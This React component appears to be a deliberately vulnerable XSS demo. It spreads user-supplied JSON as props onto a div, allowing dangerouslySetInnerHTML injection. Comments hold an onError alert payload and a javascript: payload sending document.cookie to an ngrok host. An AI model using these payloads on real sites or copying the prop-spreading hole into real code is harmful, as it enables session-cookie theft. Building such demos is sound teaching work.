import React, { useState } from "react";
import { Input, Button } from 'reakit'

// javascript:fetch('https://9432-161-22-31-212.ngrok-free.app/images/'+document.cookie, {method: "get", headers: new Headers({"ngrok-skip-browser-warning": "69420"})})
// {"style":{ "backgroundColor": "red", "width": "100px", "height": "100px"}, "dangerouslySetInnerHTML": { "__html": "<img src='a.com' onError='{alert(1)}' />" }}

export const XssTab = () => {
  const [value, setValue] = useState('')
  const [customizedBackground, setCustomizedBackground] = useState('{ "style": { "backgroundColor": "red", "width": "100px", "height": "100px"}}')
  
  const [backgroundProps, setBackgroundProps] = useState({})
  const applyStyle = () => {
    
    try {
      const parsedJson = JSON.parse(customizedBackground);
      setBackgroundProps(parsedJson);
    } catch (e) {
      console.error(e)
      setBackgroundProps(undefined)
    }
  }

    const isValidProfileLink = (url) => {
        const socialMediaPattern = /^(https?:\/\/)?(www\.)?(facebook|twitter|instagram)\.com\/[a-zA-Z0-9_]+$/;
        return socialMediaPattern.test(url);
    }

    const testProfileLink = () => {
        if (isValidProfileLink(value)) {
            window.location.href = value;
        } else {
            alert("Invalid profile link! Please enter a valid social media profile link.");
        }
    };

    return (
    <div style={{display: 'flex', flexDirection: 'column', alignItems: 'center'}}>

      <h1>Set your profile link</h1>

      <Input style={{width: '90%'}} value={value} onChange={(e) => setValue(e.target.value)}/>
      <Button onClick={testProfileLink} >Test profile link</Button>

      <h1>Customize your profile background</h1>
      <Input style={{width: '90%'}} value={customizedBackground} onChange={(e) => setCustomizedBackground(e.target.value)}/>
      <Button onClick={applyStyle}>Apply</Button>
      {!backgroundProps && <h4>Error setting styles</h4>}
      <div {...backgroundProps}></div>

    </div>
  )
}